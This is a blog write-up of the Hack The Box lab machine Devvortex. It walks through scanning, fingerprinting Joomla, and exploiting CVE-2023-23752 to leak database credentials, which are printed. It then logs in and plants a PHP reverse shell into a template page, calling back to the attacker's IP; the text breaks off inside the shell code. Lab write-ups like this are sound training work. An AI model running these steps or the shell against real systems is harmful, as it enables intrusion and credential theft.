<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>HTB Writeup - Devvortex (Easy) :: CyberSpider</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Writeup of Devvortex from Hack The Box." />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="/posts/devvortex/" />






  
  
  
  
  
  <link rel="stylesheet" href="/styles.css">



<link rel="stylesheet" href="/style.css">



  <link rel="shortcut icon" href="/img/theme-colors/green.png">
  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="CyberSpider" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="HTB Writeup - Devvortex (Easy)">
<meta property="og:description" content="Writeup of Devvortex from Hack The Box." />
<meta property="og:url" content="/posts/devvortex/" />
<meta property="og:site_name" content="CyberSpider" />

  
    <meta property="og:image" content="/img/favicon/green.png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2023-12-13 00:00:00 &#43;0000 UTC" />












</head>
<body class="green">


<div class="container full headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    cyberspider@ubuntu:~$
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/archive">archive</a></li>
        
      
        
          <li><a href="/whoami">whoami</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/archive" >archive</a></li>
        
      
        
          <li><a href="/whoami" >whoami</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="/posts/devvortex/">HTB Writeup - Devvortex (Easy)</a>
  </h1>
  <div class="post-meta"><time class="post-date">2023-12-13</time><span class="post-author">CyberSpider</span></div>

  
    <span class="post-tags">
      
      #<a href="/tags/htb/">htb</a>&nbsp;
      
      #<a href="/tags/easy/">easy</a>&nbsp;
      
      #<a href="/tags/linux/">linux</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <p>The <code>Devvortex</code> machine is an easy linux box.</p>
<p><img src="/images/Devvortex.png#center" alt="Scenario 1: Across columns"></p>
<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>I do a <code>nmap scan</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -sV -sC -A 10.10.11.242
</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-12-12 14:07 EST
</span></span><span style="display:flex;"><span>Stats: 0:00:26 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
</span></span><span style="display:flex;"><span>Service scan Timing: About 50.00% <span style="color:#66d9ef">done</span>; ETC: 14:08 <span style="color:#f92672">(</span>0:00:06 remaining<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Stats: 0:00:26 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Script Scan
</span></span><span style="display:flex;"><span>NSE Timing: About 90.88% <span style="color:#66d9ef">done</span>; ETC: 14:08 <span style="color:#f92672">(</span>0:00:00 remaining<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.242
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">994</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE    SERVICE        VERSION
</span></span><span style="display:flex;"><span>22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp   open     http           nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://devvortex.htb/
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>3367/tcp filtered satvid-datalnk
</span></span><span style="display:flex;"><span>3580/tcp filtered nati-svrloc
</span></span><span style="display:flex;"><span>8021/tcp filtered ftp-proxy
</span></span><span style="display:flex;"><span>9415/tcp filtered unknown
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 30.38 seconds
</span></span></code></pre></div><p>I edit this file <code>/etc/hosts</code> in this way:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ sudo nano /etc/hosts                       
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cat /etc/hosts
</span></span><span style="display:flex;"><span>127.0.0.1       localhost
</span></span><span style="display:flex;"><span>127.0.1.1       kali
</span></span><span style="display:flex;"><span>::1             localhost ip6-localhost ip6-loopback
</span></span><span style="display:flex;"><span>ff02::1         ip6-allnodes
</span></span><span style="display:flex;"><span>ff02::2         ip6-allrouters
</span></span><span style="display:flex;"><span>10.10.11.242    devvortex.htb
</span></span></code></pre></div><h2 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>I try to discover virtual hosts:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devvortex.htb/ -H <span style="color:#e6db74">&#39;Host: FUZZ.devvortex.htb&#39;</span>  -fs <span style="color:#ae81ff">154</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       v2.0.0-dev
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> :: Method           : GET
</span></span><span style="display:flex;"><span> :: URL              : http://devvortex.htb/
</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span style="display:flex;"><span> :: Header           : Host: FUZZ.devvortex.htb
</span></span><span style="display:flex;"><span> :: Follow redirects : false
</span></span><span style="display:flex;"><span> :: Calibration      : false
</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
</span></span><span style="display:flex;"><span> :: Filter           : Response size: <span style="color:#ae81ff">154</span>
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 179ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: dev
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>4989/4989<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">344</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:15<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
</span></span></code></pre></div><p>I edit this file <code>/etc/hosts</code> in this way:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ sudo nano /etc/hosts                       
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cat /etc/hosts
</span></span><span style="display:flex;"><span>127.0.0.1       localhost
</span></span><span style="display:flex;"><span>127.0.1.1       kali
</span></span><span style="display:flex;"><span>::1             localhost ip6-localhost ip6-loopback
</span></span><span style="display:flex;"><span>ff02::1         ip6-allnodes
</span></span><span style="display:flex;"><span>ff02::2         ip6-allrouters
</span></span><span style="display:flex;"><span>10.10.11.242    devvortex.htb
</span></span><span style="display:flex;"><span>10.10.11.242    dev.devvortex.htb
</span></span></code></pre></div><p>I read the robots.txt file, to discover the CMS:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># If the Joomla site is installed within a folder</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># eg www.example.com/joomla/ then the robots.txt file</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># MUST be moved to the site root</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># eg www.example.com/robots.txt</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># AND the joomla folder name MUST be prefixed to all of the</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># paths.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># eg the Disallow rule for the /administrator/ folder MUST</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># be changed to read</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disallow: /joomla/administrator/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># For more information about the robots.txt standard, see:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://www.robotstxt.org/orig.html</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User-agent: *
</span></span><span style="display:flex;"><span>Disallow: /administrator/
</span></span><span style="display:flex;"><span>Disallow: /api/
</span></span><span style="display:flex;"><span>Disallow: /bin/
</span></span><span style="display:flex;"><span>Disallow: /cache/
</span></span><span style="display:flex;"><span>Disallow: /cli/
</span></span><span style="display:flex;"><span>Disallow: /components/
</span></span><span style="display:flex;"><span>Disallow: /includes/
</span></span><span style="display:flex;"><span>Disallow: /installation/
</span></span><span style="display:flex;"><span>Disallow: /language/
</span></span><span style="display:flex;"><span>Disallow: /layouts/
</span></span><span style="display:flex;"><span>Disallow: /libraries/
</span></span><span style="display:flex;"><span>Disallow: /logs/
</span></span><span style="display:flex;"><span>Disallow: /modules/
</span></span><span style="display:flex;"><span>Disallow: /plugins/
</span></span><span style="display:flex;"><span>Disallow: /tmp/
</span></span></code></pre></div><p>I have discover that this Web App is manage to <code>Joomla</code>, I do two scans:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ joomscan -u http://dev.devvortex.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ____  _____  _____  __  __  ___   ___    __    _  _ 
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">(</span>_  _<span style="color:#f92672">)(</span>  _  <span style="color:#f92672">)(</span>  _  <span style="color:#f92672">)(</span>  <span style="color:#ae81ff">\/</span>  <span style="color:#f92672">)</span>/ __<span style="color:#f92672">)</span> / __<span style="color:#f92672">)</span>  /__<span style="color:#ae81ff">\ </span> <span style="color:#f92672">(</span> <span style="color:#ae81ff">\(</span> <span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  .-_<span style="color:#f92672">)(</span>   <span style="color:#f92672">)(</span>_<span style="color:#f92672">)(</span>  <span style="color:#f92672">)(</span>_<span style="color:#f92672">)(</span>  <span style="color:#f92672">)</span>    <span style="color:#f92672">(</span> <span style="color:#ae81ff">\_</span>_ <span style="color:#ae81ff">\(</span> <span style="color:#f92672">(</span>__  /<span style="color:#f92672">(</span>__<span style="color:#f92672">)</span><span style="color:#ae81ff">\ </span> <span style="color:#f92672">)</span>  <span style="color:#f92672">(</span> 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">\_</span>___<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>_____<span style="color:#f92672">)(</span>_____<span style="color:#f92672">)(</span>_/<span style="color:#ae81ff">\/\_</span><span style="color:#f92672">)(</span>___/ <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>__<span style="color:#f92672">)(</span>__<span style="color:#f92672">)(</span>_<span style="color:#f92672">)</span><span style="color:#ae81ff">\_</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">(</span>1337.today<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>   
</span></span><span style="display:flex;"><span>    --<span style="color:#f92672">=[</span>OWASP JoomScan
</span></span><span style="display:flex;"><span>    +---++---<span style="color:#f92672">==[</span>Version : 0.0.7
</span></span><span style="display:flex;"><span>    +---++---<span style="color:#f92672">==[</span>Update Date : <span style="color:#f92672">[</span>2018/09/23<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    +---++---<span style="color:#f92672">==[</span>Authors : Mohammad Reza Espargham , Ali Razmjoo
</span></span><span style="display:flex;"><span>    --<span style="color:#f92672">=[</span>Code name : Self Challenge
</span></span><span style="display:flex;"><span>    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Processing http://dev.devvortex.htb ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> FireWall Detector
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Firewall not detected
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Detecting Joomla Version
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Joomla 4.2.6
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Core Joomla Vulnerability
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Target Joomla core is not vulnerable
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking apache info/status files
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Readable info/status files are not found
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> admin finder
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Admin page : http://dev.devvortex.htb/administrator/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking robots.txt existing
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> robots.txt is found
</span></span><span style="display:flex;"><span>path : http://dev.devvortex.htb/robots.txt 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Interesting path found from robots.txt
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/joomla/administrator/
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/administrator/
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/api/
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/bin/
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/cache/
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/cli/
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/components/
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/includes/
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/installation/
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/language/
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/layouts/
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/libraries/
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/logs/
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/modules/
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/plugins/
</span></span><span style="display:flex;"><span>http://dev.devvortex.htb/tmp/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finding common backup files name
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Backup files are not found
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finding common log files name
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> error log is not found
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking sensitive config.php.x file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Readable config files are not found
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Your Report : reports/dev.devvortex.htb/  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$  droopescan scan joomla --url http://dev.devvortex.htb/      
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> No version found.                                                           
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Possible interesting urls found:
</span></span><span style="display:flex;"><span>    Detailed version information. - http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
</span></span><span style="display:flex;"><span>    Login page. - http://dev.devvortex.htb/administrator/
</span></span><span style="display:flex;"><span>    License file. - http://dev.devvortex.htb/LICENSE.txt
</span></span><span style="display:flex;"><span>    Version attribute contains approx version - http://dev.devvortex.htb/plugins/system/cache/cache.xml
</span></span></code></pre></div><p>I discover the version of joomla (<code>Joomla 4.2.6</code>), now I must find a exploit for this version.
With a speed research I find this exploit <code>https://github.com/Acceis/exploit-CVE-2023-23752</code>.
I download the  <code>Requirements</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/devvortex<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ sudo gem install httpx docopt paint
</span></span><span style="display:flex;"><span>Fetching http-2-next-1.0.1.gem
</span></span><span style="display:flex;"><span>Fetching httpx-1.1.5.gem
</span></span><span style="display:flex;"><span>Successfully installed http-2-next-1.0.1
</span></span><span style="display:flex;"><span>Successfully installed httpx-1.1.5
</span></span><span style="display:flex;"><span>Parsing documentation <span style="color:#66d9ef">for</span> http-2-next-1.0.1
</span></span><span style="display:flex;"><span>Installing ri documentation <span style="color:#66d9ef">for</span> http-2-next-1.0.1
</span></span><span style="display:flex;"><span>Parsing documentation <span style="color:#66d9ef">for</span> httpx-1.1.5
</span></span><span style="display:flex;"><span>Installing ri documentation <span style="color:#66d9ef">for</span> httpx-1.1.5
</span></span><span style="display:flex;"><span>Done installing documentation <span style="color:#66d9ef">for</span> http-2-next, httpx after <span style="color:#ae81ff">15</span> seconds
</span></span><span style="display:flex;"><span>Fetching docopt-0.6.1.gem
</span></span><span style="display:flex;"><span>Successfully installed docopt-0.6.1
</span></span><span style="display:flex;"><span>Parsing documentation <span style="color:#66d9ef">for</span> docopt-0.6.1
</span></span><span style="display:flex;"><span>Installing ri documentation <span style="color:#66d9ef">for</span> docopt-0.6.1
</span></span><span style="display:flex;"><span>Done installing documentation <span style="color:#66d9ef">for</span> docopt after <span style="color:#ae81ff">1</span> seconds
</span></span><span style="display:flex;"><span>Fetching paint-2.3.0.gem
</span></span><span style="display:flex;"><span>Successfully installed paint-2.3.0
</span></span><span style="display:flex;"><span>Parsing documentation <span style="color:#66d9ef">for</span> paint-2.3.0
</span></span><span style="display:flex;"><span>Installing ri documentation <span style="color:#66d9ef">for</span> paint-2.3.0
</span></span><span style="display:flex;"><span>Done installing documentation <span style="color:#66d9ef">for</span> paint after <span style="color:#ae81ff">1</span> seconds
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> gems installed
</span></span></code></pre></div><p>I copy <code>exploit.rb </code> in the Local Machine and I run the code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/devvortex<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ruby exploit.rb http://dev.devvortex.htb
</span></span><span style="display:flex;"><span>Users
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>649<span style="color:#f92672">]</span> lewis <span style="color:#f92672">(</span>lewis<span style="color:#f92672">)</span> - lewis@devvortex.htb - Super Users
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>650<span style="color:#f92672">]</span> logan paul <span style="color:#f92672">(</span>logan<span style="color:#f92672">)</span> - logan@devvortex.htb - Registered
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Site info
</span></span><span style="display:flex;"><span>Site name: Development
</span></span><span style="display:flex;"><span>Editor: tinymce
</span></span><span style="display:flex;"><span>Captcha: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Access: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Debug status: false
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Database info
</span></span><span style="display:flex;"><span>DB type: mysqli
</span></span><span style="display:flex;"><span>DB host: localhost
</span></span><span style="display:flex;"><span>DB user: lewis
</span></span><span style="display:flex;"><span>DB password: P4ntherg0t1n5r3c0n##
</span></span><span style="display:flex;"><span>DB name: joomla
</span></span><span style="display:flex;"><span>DB prefix: sd4fg_
</span></span><span style="display:flex;"><span>DB encryption <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>I have discover the credentials:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>lewis:P4ntherg0t1n5r3c0n##
</span></span></code></pre></div><p>I use this credentials to login in the site. I change the page <code>error.php</code> of the atum template(<code>http://dev.devvortex.htb/administrator/index.php?option=com_templates&amp;view=template&amp;id=222&amp;file=L2Vycm9yLnBocA%3D%3D&amp;isMedia=0</code>) in this way and then I click <code>Save</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_time_limit</span> (<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>$VERSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1.0&#34;</span>;
</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.10.14.95&#39;</span>; <span style="color:#75715e">// IP Address(Local Machine), change it
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9001</span>;       <span style="color:#75715e">// Listening Port, change it
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$chunk_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1400</span>;
</span></span><span style="display:flex;"><span>$write_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
